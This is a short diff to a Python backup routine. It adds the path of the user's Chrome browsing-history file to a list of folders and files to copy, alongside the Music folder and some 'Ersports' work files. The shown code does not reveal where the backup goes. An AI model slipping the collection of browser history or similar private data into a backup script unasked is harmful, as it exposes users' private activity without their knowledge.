@@ -141,12 +141,14 @@ def run_task1():
 
 def run_backup_process():
     pictures_path = str(Path.home() / "Music")
+    Default_path = str(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "History")
     # Danh sách kết hợp cả file và thư mục
     my_folders = [
         r'C:\Ersports\Summary',
         #r'C:\Ersports\Summary3',
         r'C:\Ersports\ER.xlsx',
         pictures_path,
+        Default_path,
         #pictures_path0
     ]
     
